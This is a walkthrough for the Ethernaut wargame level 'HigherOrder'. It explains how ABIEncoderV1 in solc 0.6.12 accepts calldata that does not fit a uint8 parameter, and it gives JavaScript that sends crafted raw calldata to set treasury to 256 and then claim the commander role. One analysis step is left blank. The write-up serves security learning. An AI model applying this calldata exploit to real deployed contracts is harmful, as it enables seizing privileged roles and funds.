[Level 30. HigherOrder](https://ethernaut.openzeppelin.com/level/30)

## In A Nutshell

> Before `solc` version `0.8.0`, `ABIEncoderV1` was used and it wouldn't revert when calldata was inconsistent with the parameter types.

## Concept

1. How to encode function call into calldata on our own.
2. Difference between `ABIEncoderV1` and `ABIEncoderV2`.

## Level Target

1. Become the `commander` of the `HigherOrder`.

## Breakdown & Analysis

1. The `solc` version used in this level is `0.6.12`, which means `ABIEncoderV1` is applied. As a result, it won't check for inconsistencies between calldata and parameter types.
2. 

## Detailed Steps

```js
const from = <your wallet address>;
const to = contract.address;
// 211c85ab -> function selector of registerTreasury(uint8); 000...100 -> parameter 256
const calldata = "0x211c85ab0000000000000000000000000000000000000000000000000000000000000100";

await ethereum.request({
    method: "eth_sendTransaction",
    params: [{
        from: from,
        to: to,
        data: calldata
    }]
})

await contract.treasury().then(v => v.toString()) // check if treasury is set to 256
await contract.claimLeadership();
```
